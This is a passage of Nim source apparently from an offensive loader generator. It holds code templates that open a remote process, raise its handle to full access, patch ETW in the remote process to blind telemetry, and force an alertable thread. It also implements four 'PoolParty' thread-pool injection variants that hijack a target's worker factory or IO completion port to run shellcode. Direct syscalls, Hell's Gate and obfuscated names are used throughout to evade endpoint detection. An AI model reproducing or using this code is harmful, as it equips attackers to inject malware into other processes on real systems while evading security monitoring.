            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        var cid: CLIENT_ID
        when not defined(spawninject):
            var hProcssetw: HANDLE
            var hProcHighPriv: HANDLE
        var status: NTSTATUS
        cid.UniqueProcess = remoteProcID
        var oa: OBJECT_ATTRIBUTES
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_QUERY_INFORMATION,&oa, &cid)

                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
                DuplicateHandle(-1, hProcss, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] DuplicateHandle: "), toHex(status)
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(
                    &hProcssetw,
                    PROCESS_QUERY_INFORMATION, 
                    &oa, &cid         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
                when defined(Hellsgate):
                    if getSyscall(ntDuplicateTable):
                        syscall = ntDuplicateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
                status = NtDuplicateObject(-1, hProcssetw, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] NtDuplicateObject: "), toHex(status)
        
        when not defined(spawninject):
            var procHandle: HANDLE = hProcHighPriv
        else:
            var procHandle: HANDLE = hProcHighPriv

        success = RemotePatchETW(procHandle)
        
        when defined(verbose):
            echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"


"""


let RemoteLoadNTDLLStub* = """

    # Ntdll.dll is always loaded, this made no sense

"""


let RemoteForceSleepStub* = """

    proc remoteForceSleep(targetProcess: HANDLE): HANDLE =

    
        # A long Sleep time, so that for any sleep-in-between time, the thread will still be in an alertable state
        var friendlycode: array[3, char]  = [char(0xFF), char(0xFF), char(0xFF)]
        
        when defined(verbose):
            echo obf("[*] Forcing Sleep for alertable state thread in the remote process: "), targetProcess
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)


        when defined(SysWhispers):
            status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("kernel32.dll")), obf("SleepEx")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,targetProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            
            if(status == 0):
                return tHandle
            else:
                return 0
        else:
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                targetProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                targetProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                targetProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(verbose):
                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                targetProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            #status = NtClose(tHandle)

            if(status == 0):
                return tHandle
            else:
                return 0
            

"""

let PoolpartyExecute* = """

    proc ExecutePoolparty(pHandle: HANDLE,startPointer: LPVOID) =


        proc NtQueryObjectWrap(x: HANDLE, y: OBJECT_INFORMATION_CLASS): ptr BYTE =
            var InformationLength: ULONG = 0
            var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
            # Information is a byte sequence with the length of y
            var oinfoBuffer = VirtualAlloc(NULL, sizeof(OBJECT_TYPE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
            Ntstatus = NtQueryObject(x, y, oinfoBuffer, InformationLength, addr InformationLength)
            if (Ntstatus == 0):
                #echo obf("[+] NtQueryObject success")
                Sleep(100)
                return cast[ptr BYTE](oinfoBuffer)
            while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
                #Information = cast[PBYTE](MSVCRT$realloc(Information, InformationLength))
                #echo "NTQuery Length mismatch"
                VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
                oinfoBuffer = VirtualAlloc(NULL, InformationLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                #Information = cast[ptr BYTE](realloc(Information, InformationLength))
                #var Information2: seq[byte] = newSeq[byte](InformationLength)
                #echo "REalloc done"
                Ntstatus = NtQueryObject(x, y, oinfoBuffer, InformationLength, addr InformationLength)
                #echo "status: ", toHex(Ntstatus)
                if(Ntstatus == 0):
                    Sleep(100)

            return cast[ptr BYTE](oinfoBuffer)

        proc HijackProcessHandle(wsObjectType: PWSTR, p_hTarget: HANDLE, dwDesiredAccess: DWORD): HANDLE =
            var Information: PBYTE = nil
            var lhInfo: PROCESS_HANDLE_SNAPSHOT_INFORMATION
            var phInfo: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = addr lhInfo
            var QueryBuffer = VirtualAlloc(NULL, sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
            var size: ULONG = cast[ULONG](sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION))
            var InformationLength: ULONG = 0
            var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
            Sleep(100)
            Ntstatus = NtQueryInformationProcess(p_hTarget, PROCESS_INFORMATION_CLASS(ProcessHandleInformation), QueryBuffer, size, addr InformationLength)
            # if fail, retry with new InformationLength
            var test: int = 0
            while (Ntstatus == STATUS_INFO_LENGTH_MISMATCH):
                Sleep(100)
                VirtualFree(QueryBuffer, 0, MEM_RELEASE)
                QueryBuffer = VirtualAlloc(NULL, cast[SIZE_T](InformationLength), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                size = InformationLength
                #var lhInfo2: PROCESS_HANDLE_SNAPSHOT_INFORMATION
                #var phInfo2: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = addr lhInfo2
                #Information = cast[PBYTE](realloc(Information, InformationLength))
                #var InformationLength2: ULONG = 0
                Ntstatus = NtQueryInformationProcess(p_hTarget, PROCESS_INFORMATION_CLASS(ProcessHandleInformation), QueryBuffer, size, addr InformationLength)
                if Ntstatus == 0:
                    phInfo = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](QueryBuffer)
                test += 1
                if test > 10:
                    break
            
            if Ntstatus != 0:
                when defined(verbose):
                    echo obf("[-] Still Failed")
                    echo toHex(Ntstatus)
                return 0
            
            var pProcessHandleInformation: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](phInfo)
            var p_hDuplicatedObject: HANDLE
            
            Sleep(100)
            for i in 0 ..< pProcessHandleInformation.NumberOfHandles:
                
                var uncheckedArray: ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO] = cast[ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO]](addr pProcessHandleInformation.Handles[0])
                # use it via uncheckedArray[i].HandleValue

                var success: BOOL = DuplicateHandle(
                    p_hTarget,
                    cast[HANDLE](uncheckedArray[i].HandleValue),#pProcessHandleInformation.Handles[i].HandleValue), #tableEntrynoPointer.HandleValue#),
                    GetCurrentProcess(), 
                    addr p_hDuplicatedObject,
                    dwDesiredAccess,
                    FALSE,
                    0)
                
                    
                
                var pObjectInformation: ptr BYTE = nil
                Sleep(100)
                
                if (p_hDuplicatedObject != 0):
                    pObjectInformation = NtQueryObjectWrap(p_hDuplicatedObject, cast[OBJECT_INFORMATION_CLASS](2))
                
                var pObjectTypeInformation: PPUBLIC_OBJECT_TYPE_INFORMATION = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](pObjectInformation)
                
                # if wsObjectType != pObjectTypeInformation.TypeName.Buffer: continue
                #echo "First: ", wsObjectType
                if pObjectTypeInformation == nil:
                    continue
                if pObjectTypeInformation.TypeName.Buffer == nil:
                    continue
                #echo "Second: ", pObjectTypeInformation.TypeName.Buffer
                if(wcscmp(wsObjectType,pObjectTypeInformation.TypeName.Buffer) != 0):
                    continue
                when defined(verbose):
                    echo obf("[+] Found Hijack Handle")
                

                return p_hDuplicatedObject

            return 0


        proc GetWorkerFactoryBasicInformation(hWorkerFactory: HANDLE): WORKER_FACTORY_BASIC_INFORMATION =
            var WorkerInput2 #[QUERY_WORKERFACTORYINFOCLASS WorkerFactoryBasicInformation2]# : QUERY_WORKERFACTORYINFOCLASS = QUERY_WORKERFACTORYINFOCLASS.WorkerFactoryBasicInformation2
            var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
            var status: NTSTATUS
            status = NtQueryInformationWorkerFactory(hWorkerFactory, WorkerInput2, addr WorkerFactoryInformation, ULONG(sizeof(WorkerFactoryInformation)), nil)
            return WorkerFactoryInformation

        # HijackWorkerFactoryProcessHandle is equal to HijackProcessHandle with wsObjectType = "TpWorkerFactory"

        proc SetupExecution(p_hWorkerFactory: HANDLE) =
            var WorkerFactoryMinimumThreadNumber: ULONG = 4
            var WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS = SET_WORKERFACTORYINFOCLASS.WorkerFactoryThreadMinimum
            var WorkerFactoryInformationLength: ULONG = ULONG(sizeof(ULONG))
            var status: NTSTATUS
            when defined(verbose):
                echo obf("[+] Starting new worker and therefore leads to execution")
            status = NtSetInformationWorkerFactory(p_hWorkerFactory, WorkerFactoryInformationClass, addr WorkerFactoryMinimumThreadNumber, WorkerFactoryInformationLength)
            if (status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to set target process worker factory minimum threads")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Set target process worker factory minimum threads to: "), WorkerFactoryMinimumThreadNumber

        proc HijackHandles(p_hWorkerFactory: HANDLE) =
            var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
            WorkerFactoryInformation = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
        

        when defined(variant1):
            
            var trampoline: seq[byte]
            if defined(amd64):
                trampoline = @[
                    byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
                    byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
                ]
                var tempjumpaddr: uint64 = cast[uint64](startPointer)
                copyMem(&trampoline[2] , &tempjumpaddr, 6)
            elif defined(i386):
                trampoline = @[
                    byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
                    byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
                ]
                var tempjumpaddr: uint32 = cast[uint32](startPointer)
                copyMem(&trampoline[1] , &tempjumpaddr, 3)
            
            # Hijack target Worker Factory
            #echo "Start hijack"
            var p_hWorkerFactory: HANDLE = HijackProcessHandle("TpWorkerFactory", pHandle, WORKER_FACTORY_ALL_ACCESS)
            if(p_hWorkerFactory == 0):
                when defined(verbose):
                    echo obf("[-] Failed to hijack the target process worker factory")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Hijacked the target process worker factory")


            # Get Worker Factory Information via NtQueryInformationWorkerFactory

            var workerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
            when defined(verbose):
                echo obf("[+] Got Worker Factory Information.")
            # Get start routine
            var startRoutine: LPVOID = workerFactoryInformation.StartRoutine
            when defined(verbose):
                echo obf("[+] Got start routine")
            var bytesWritten: SIZE_T = 0
            var success: BOOL = WriteProcessMemory(
                pHandle,
                startRoutine,
                addr trampoline[0],
                trampoline.len,
                addr bytesWritten
            )
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Failed to write Trampolin into start routine")
                    echo GetLastError()
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Successfully wrote Trampolin into start routine")

            # Setup execution
            SetupExecution(p_hWorkerFactory)

        when defined(variant2):
            # Hijack target Worker Factory
            var p_hWorkerFactory: HANDLE = HijackProcessHandle("TpWorkerFactory", pHandle, WORKER_FACTORY_ALL_ACCESS)
            if(p_hWorkerFactory == 0):
                when defined(verbose):
                    echo obf("[-] Failed to hijack the target process worker factory")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Hijacked the target process worker factory")
            # Get Worker Factory Information via NtQueryInformationWorkerFactory
            var workerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
            when defined(verbose):
                echo obf("[+] Got Worker Factory Information.")

            
            var targetTaskQueueHighPriorityList: LPVOID = cast[LPVOID](cast[uint64](workerFactoryInformation.StartParameter) + cast[uint64](0x1E0))

            
            var pTpWork: LPVOID = cast[LPVOID](CreateThreadpoolWork(cast[PTP_WORK_CALLBACK](startPointer), nil, nil))
            
            let ExchangeValue: int32 = 0x2
            var ExchangeLPVOID: LPVOID = unsafeAddr ExchangeValue
            copyMem(cast[LPVOID](pTpWork + 0x90), cast[LPVOID](addr workerFactoryInformation.StartParameter), 8)
            copyMem(cast[LPVOID](pTpWork + 0xD8), cast[LPVOID](addr targetTaskQueueHighPriorityList), 8)
            copyMem(cast[LPVOID](pTpWork + 0xE0), cast[LPVOID](addr targetTaskQueueHighPriorityList), 8)
            copyMem(cast[LPVOID](pTpWork + 0xE8),ExchangeLPVOID, 8)

            when defined(verbose):
                echo obf("[+] Modified the TP_WORK structure to be associated with target process's TP_POOL")
            var pRemoteTpWork: LPVOID
            pRemoteTpWork = cast[LPVOID](VirtualAllocEx(pHandle, nil, 240#[SizeOf FullTpWork]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
            
            var bytWritten: SIZE_T = 0
            success = WriteProcessMemory(pHandle, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), addr bytWritten)
            if(success == 0):
                quit(1)
            
            var RemoteWorkItemTaskList: LPVOID = (cast[LPVOID](pRemoteTpWork) + 0xD8)
            var targetAddress: LPVOID = nil
            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E0)
            success = WriteProcessMemory(pHandle,targetAddress,addr RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), addr bytWritten)
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Queue Entry one overwrite failed")
                    echo GetLastError()
                quit(1)
            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E8)
            success = WriteProcessMemory(pHandle,targetAddress,addr RemoteWorkItemTaskList,  sizeof(RemoteWorkItemTaskList), addr bytWritten)
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Queue Entry two overwrite failed")
                    echo GetLastError()
                quit(1)
            when defined(verbose):
                echo obf("[+] Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK")



        when defined(variant3):
            

            var pTpWait: LPVOID = cast[LPVOID](CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](startPointer), nil, nil))
            when defined(verbose):
                echo obf("[+] Created TP_WAIT structure associated with the shellcode")
                echo obf("------------------------------------------------------------------------------------\r\n")

            var pRemoteTpWait: PVOID
            pRemoteTpWait = cast[PVOID](VirtualAllocEx(pHandle, nil, 472 #[sizeof(FULL_TP_WAIT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))

            var bytWritten: SIZE_T = 0
            success = WriteProcessMemory(pHandle, pRemoteTpWait, pTpWait, 472#[sizeof(FULL_TP_WAIT)]#, addr bytWritten)
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Failed to write the specially crafted TP_WAIT structure to the target process")
                quit(1)
            
            var pRemoteTpDirect: PVOID
            pRemoteTpDirect = cast[PVOID](VirtualAllocEx(pHandle, nil, 72#[sizeof(TP_DIRECT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
            
            var pTpWait_Direct: PVOID = cast[PVOID](pTpWait + 0x188)
            success = WriteProcessMemory(pHandle, pRemoteTpDirect, pTpWait_Direct, 72#[sizeof(TP_DIRECT)]#, addr bytWritten)
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Failed to write the TP_DIRECT structure to the target process")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Successfully written the TP_DIRECT structure to the target process")
            
            var p_hEvent: HANDLE = CreateEvent(nil, FALSE, FALSE, "PoolParty")
            if(p_hEvent == 0):
                when defined(verbose):
                    echo obf("[-] Failed to create event with name `PoolPartyEvent`")
                when defined(verbose):
                    echo GetLastError()
                quit(1)
            
            var pTpWaitWaitPkt: LPVOID = cast[LPVOID](cast[LPVOID](pTpWait + 0x170)#[waitPkt offset]#)
            var testHandle: HANDLE
            var testHandleAddr: ptr HANDLE = addr testHandle
            # copyMem from pTpWaitWaitPkt to testHandleAddr
            copyMem(cast[LPVOID](addr testHandle), pTpWaitWaitPkt, 8)
            var m_p_hIoCompletion: HANDLE = HijackProcessHandle("IoCompletion", pHandle, IO_COMPLETION_ALL_ACCESS)
            if (m_p_hIoCompletion == 0):
                when defined(verbose):
                    echo obf("[-] Failed to hijack the IO completion port of the target process worker factory")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Hijacked the IO completion port of the target process worker factory")
            var ulongValue: ULONG = 0
            var ulongPtr: ULONG_PTR = cast[ULONG_PTR](addr ulongValue)
            var booleanValue: BOOLEAN = 0
            var booleanPointer: PBOOLEAN = cast[PBOOLEAN](addr booleanValue)
            var status: NTSTATUS = ZwAssociateWaitCompletionPacket(cast[HANDLE](testHandle), m_p_hIoCompletion, p_hEvent, pRemoteTpDirect, pRemoteTpWait, 0, ulongPtr, booleanPointer)
            
            if(status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to associate event with the IO completion port of the target process worker factory")
                when defined(verbose):
                    echo toHex(status)
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Associated event with the IO completion port of the target process worker factory")
            
            success = SetEvent(p_hEvent)
            if(success == 0):
                when defined(verbose):
                    echo obf("[-] Failed to set event to queue a packet to the IO completion port of the target process worker factory")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Set event to queue a packet to the IO completion port of the target process worker factory")



        when defined(variant4):
            
            var m_p_hIoCompletion: HANDLE = HijackProcessHandle("IoCompletion", pHandle, IO_COMPLETION_ALL_ACCESS)
            if (m_p_hIoCompletion == 0):
                when defined(verbose):
                    echo obf("[-] Failed to hijack the IO completion port of the target process worker factory")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Hijacked the IO completion port of the target process worker factory")
            var Direct : TP_DIRECT
            # print sizeof TP_DIRECT
            
            Direct.Callback = cast[PTP_WIN32_IO_CALLBACK](startPointer)

            var RemoteDirectAddress: LPVOID
            RemoteDirectAddress = cast[LPVOID](VirtualAllocEx(pHandle, nil, 72#[sizeof(TP_DIRECT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
            var bytWritten: SIZE_T = 0
            success = WriteProcessMemory(pHandle, RemoteDirectAddress, addr Direct, 72#[sizeof(TP_DIRECT)]#, addr bytWritten)
            if(success == 0):
                when defined(verbose):
                    echo obf("Failed to write the TP_DIRECT structure to the target process")
                quit(1)
            var ulongValue: ULONG = 0
            var ulongPtr: ULONG_PTR = cast[ULONG_PTR](addr ulongValue)
            var status: NTSTATUS = ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, nil, 0, ulongPtr)
            if(status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to queue a packet to the IO completion port of the target process worker factory")
                    echo toHex(status)
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Queued a packet to the IO completion port of the target process worker factory")
        

"""


let PoolpartyTypeDefs* = """



type PROCESS_HANDLE_TABLE_ENTRY_INFO* = object
    HandleValue: HANDLE
    HandleCount: ULONG_PTR
    PointerCount: ULONG_PTR
    GrantedAccess: ACCESS_MASK
    ObjectTypeIndex: ULONG
    HandleAttributes: ULONG
    Reserved: ULONG


type PROCESS_HANDLE_SNAPSHOT_INFORMATION* = object
    NumberOfHandles: ULONG_PTR
    Reserved: ULONG_PTR
    Handles: array[0..0, PROCESS_HANDLE_TABLE_ENTRY_INFO] 


type PPROCESS_HANDLE_SNAPSHOT_INFORMATION* = ptr PROCESS_HANDLE_SNAPSHOT_INFORMATION

var ProcessHandleInformation*: PROCESS_INFORMATION_CLASS = 51


type WORKER_FACTORY_BASIC_INFORMATION* = object
    Timeout: LARGE_INTEGER
    RetryTimeout: LARGE_INTEGER
    IdleTimeout: LARGE_INTEGER
    Paused: BOOLEAN
    TimerSet: BOOLEAN
    QueuedToExWorker: BOOLEAN
    MayCreate: BOOLEAN
    CreateInProgress: BOOLEAN
    InsertedIntoQueue: BOOLEAN
    Shutdown: BOOLEAN
    BindingCount: ULONG
    ThreadMinimum: ULONG
    ThreadMaximum: ULONG
    PendingWorkerCount: ULONG
    WaitingWorkerCount: ULONG
    TotalWorkerCount: ULONG
    ReleaseCount: ULONG
    InfiniteWaitGoal: LONGLONG
    StartRoutine: PVOID
    StartParameter: PVOID
    ProcessId: HANDLE
    StackReserve: SIZE_T
    StackCommit: SIZE_T
    LastThreadCreationStatus: NTSTATUS

type PWORKER_FACTORY_BASIC_INFORMATION* = ptr WORKER_FACTORY_BASIC_INFORMATION

type PUBLIC_OBJECT_TYPE_INFORMATION* = object
    TypeName: UNICODE_STRING
    Reserved: array[22, ULONG]

type PPUBLIC_OBJECT_TYPE_INFORMATION* = ptr PUBLIC_OBJECT_TYPE_INFORMATION


type TP_TASK_CALLBACKS* = object
    ExecuteCallback: PVOID
    Unposted: PVOID

type PTP_TASK_CALLBACKS* = ptr TP_TASK_CALLBACKS

type TP_TASK* = object
    Callbacks: PTP_TASK_CALLBACKS
    NumaNode: UINT32
    IdealProcessor: UINT8
    Padding_242: array[3, char]
    ListEntry: LIST_ENTRY

type PTP_TASK* = ptr TP_TASK # PTP_TASK_CALLBACKS

type TPP_REFCOUNT* = object
    Refcount: INT32

type PTPP_REFCOUNT* = ptr TPP_REFCOUNT

type TPP_CALLER* = object
    ReturnAddress: PVOID

type PTPP_CALLER* = ptr TPP_CALLER

type TPP_PH_LINKS* = object
    Siblings: LIST_ENTRY
    Children: LIST_ENTRY
    Key: INT64

type PTPP_PH_LINKS* = ptr TPP_PH_LINKS

type TPP_PH* = object
    Root: PTPP_PH_LINKS

type PTPP_PH* = ptr TPP_PH

type TP_DIRECT* = object
    Task: TP_TASK
    Lock: UINT64
    IoCompletionInformationList: LIST_ENTRY
    Callback: PVOID
    NumaNode: UINT32
    IdealProcessor: UINT8
    Padding_242: array[3, char]

type PTP_DIRECT* = ptr TP_DIRECT

type TPP_TIMER_SUBQUEUE* = object
    Expiration: INT64
    WindowStart: TPP_PH
    WindowEnd: TPP_PH
    Timer: PVOID
    TimerPkt: PVOID
    Direct: TP_DIRECT
    ExpirationWindow: UINT32
    Padding_242: array[1, INT32]

type PTPP_TIMER_SUBQUEUE* = ptr TPP_TIMER_SUBQUEUE

type TPP_TIMER_QUEUE* = object
    Lock: RTL_SRWLOCK
    AbsoluteQueue: TPP_TIMER_SUBQUEUE
    RelativeQueue: TPP_TIMER_SUBQUEUE
    AllocatedTimerCount: INT32
    Padding_242: array[1, INT32]

type PTPP_TIMER_QUEUE* = ptr TPP_TIMER_QUEUE

type TPP_NUMA_NODE* = object
    WorkerCount: INT32

type PTPP_NUMA_NODE* = ptr TPP_NUMA_NODE

type TPP_POOL_QUEUE_STATE* = object
    Exchange: INT64
    RunningThreadGoal: INT32
    PendingReleaseCount: UINT32
    QueueLength: UINT32

type PTPP_POOL_QUEUE_STATE* = ptr TPP_POOL_QUEUE_STATE

type TPP_QUEUE* = object
    Queue: LIST_ENTRY
    Lock: RTL_SRWLOCK

type PTPP_QUEUE* = ptr TPP_QUEUE

type FULL_TP_POOL* = object
    Refcount: TPP_REFCOUNT
    Padding_239: clong
    QueueState: TPP_POOL_QUEUE_STATE
    TaskQueue: array[3, PTPP_QUEUE]
    NumaNode: PTPP_NUMA_NODE
    ProximityInfo: PGROUP_AFFINITY
    WorkerFactory: PVOID
    CompletionPort: PVOID
    Lock: RTL_SRWLOCK
    PoolObjectList: LIST_ENTRY
    WorkerList: LIST_ENTRY
    TimerQueue: TPP_TIMER_QUEUE
    ShutdownLock: RTL_SRWLOCK
    ShutdownInitiated: UINT8
    Released: UINT8
    PoolFlags: UINT16
    Padding_240: clong
    PoolLinks: LIST_ENTRY
    AllocCaller: TPP_CALLER
    ReleaseCaller: TPP_CALLER
    AvailableWorkerCount: INT32
    LongRunningWorkerCount: INT32
    LastProcCount: UINT32
    NodeStatus: INT32
    BindingCount: INT32
    CallbackChecksDisabled: UINT32
    TrimTarget: UINT32
    TrimmedThrdCount: UINT32
    SelectedCpuSetCount: UINT32
    Padding_241: clong
    TrimComplete: RTL_CONDITION_VARIABLE
    TrimmedWorkerList: LIST_ENTRY

type PFULL_TP_POOL* = ptr FULL_TP_POOL


type TPP_ITE_WAITER* = object
    Next: ptr TPP_ITE_WAITER
    ThreadId: PVOID

type PTPP_ITE_WAITER* = ptr TPP_ITE_WAITER

type TPP_ITE* = object
    First: PTPP_ITE_WAITER

type PTPP_ITE* = ptr TPP_ITE

type TPP_FLAGS_COUNT* = object
    Count: UINT64
    Flags: UINT64
    Data: INT64

type TPP_BARRIER* = object
    Ptr: TPP_FLAGS_COUNT
    WaitLock: RTL_SRWLOCK
    WaitList: TPP_ITE


type
  ALPC_WORK_ON_BEHALF_TICKET* = object
    ThreadId: UINT32
    ThreadCreationTimeLow: UINT32



type
  TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC* = distinct proc (Member: PTPP_CLEANUP_GROUP_MEMBER)
  PTPP_CLEANUP_GROUP_MEMBER_CALLBACK* = ptr TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC
  TPP_CLEANUP_GROUP_MEMBER_VFUNCS* = object
    CallbackEpilog: ptr PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
    StopCallbackGeneration: PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
    CancelPendingCallbacks: PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
  TPP_CLEANUP_GROUP_MEMBER* = object
    Refcount: TPP_REFCOUNT
    Padding_233: cint
    VFuncs: ptr TPP_CLEANUP_GROUP_MEMBER_VFUNCS
    CleanupGroup: PTP_CLEANUP_GROUP
    CleanupGroupCancelCallback: PVOID
    FinalizationCallback: PVOID
    CleanupGroupMemberLinks: LIST_ENTRY
    CallbackBarrier: TPP_BARRIER
    Callback: PVOID
    WorkCallback: PVOID
    SimpleCallback: PVOID
    TimerCallback: PVOID
    WaitCallback: PVOID
    IoCallback: PVOID
    AlpcCallback: PVOID
    AlpcCallbackEx: PVOID
    JobCallback: PVOID
    Context: PVOID
    ActivationContext: ptr ACTIVATION_CONTEXT
    SubProcessTag: PVOID
    ActivityId: GUID
